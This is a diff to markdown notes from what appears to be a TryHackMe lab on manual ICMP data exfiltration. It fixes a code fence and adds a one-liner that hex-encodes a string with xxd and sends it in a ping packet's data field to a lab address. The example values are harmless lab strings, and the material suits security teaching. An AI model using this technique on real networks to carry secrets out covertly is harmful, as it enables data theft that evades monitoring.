@@ -24,7 +24,7 @@ To perform manual ICMP data exfiltration, we need to discuss the **`ping`** comm
 <br>
 ```bash
 #Sending one ICMP packet using the PING Command:
-```thm@AttackBox$ ping 10.10.144.103 -c 1
+thm@AttackBox$ ping 10.10.144.103 -c 1
 ```
 <br>
 We choose to send one ICMP packet from Host 1, our AttackBox, to Host 2, the target machine, using the **`-c 1`** argument from the previous command. Now let's examine the ICMP packet in Wireshark and see what the Data section looks like.
@@ -51,6 +51,11 @@ We used the **`xxd`** command to convert our string to Hex, and then we can use 
 ```bash
 #Send Hex using the ping command:
 root@AttackBox$ ping 10.10.144.103 -c 1 -p 74686d3a7472796861636b6d650a
+```
+
+##### **or for a one-liner:**
+```bash
+ping -c 1 192.198.1.5 -p $(echo -n "test" | xxd -p)
 ```
 <br>
 We sent one ICMP packet using the ping command with **`thm:tryhackme`** Data. Let's look at the Data section for this packet in the Wireshark.
